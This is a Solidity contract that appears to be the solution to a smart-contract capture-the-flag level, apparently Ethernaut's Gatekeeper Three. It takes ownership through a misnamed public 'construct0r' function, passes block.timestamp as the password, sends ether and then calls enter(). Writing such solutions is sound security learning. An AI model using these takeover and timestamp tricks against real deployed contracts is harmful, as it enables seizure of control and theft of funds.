// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./28GatekeeperThree.sol";

error TransactionFailed();

contract GatekeeperThreeSolution {
    GatekeeperThree public gatekeeperThree;

    constructor(address gatekeeperThreeAddress) {
        gatekeeperThree = GatekeeperThree(payable(gatekeeperThreeAddress));
    }

    function solveChallenge() public payable {
        gatekeeperThree.construct0r();

        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);

        (bool success, ) = address(gatekeeperThree).call{value: msg.value}("");
        if (success == false) revert TransactionFailed();

        gatekeeperThree.enter();
    }
}
